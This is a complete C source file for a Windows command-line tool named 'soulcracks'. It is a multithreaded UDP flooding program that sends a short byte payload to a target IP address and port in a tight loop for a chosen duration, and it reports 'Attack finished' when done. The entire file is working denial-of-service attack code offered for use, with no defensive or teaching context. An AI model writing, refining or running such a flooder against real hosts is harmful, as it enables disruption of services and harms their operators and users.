#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <pthread.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")  // Link with the Winsock library

void usage() {
    printf("Usage: soulcracks ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    SOCKET sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\xd9\x00",
    };

    // Initialize Winsock
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed with error: %d\n", WSAGetLastError());
        pthread_exit(NULL);
    }

    // Create socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == INVALID_SOCKET) {
        perror("Socket creation failed");
        WSACleanup();
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
                perror("Send failed");
                closesocket(sock);
                WSACleanup();
                pthread_exit(NULL);
            }
        }
    }

    closesocket(sock);
    WSACleanup();
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        data->ip = ip;
        data->port = port;
        data->time = time;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
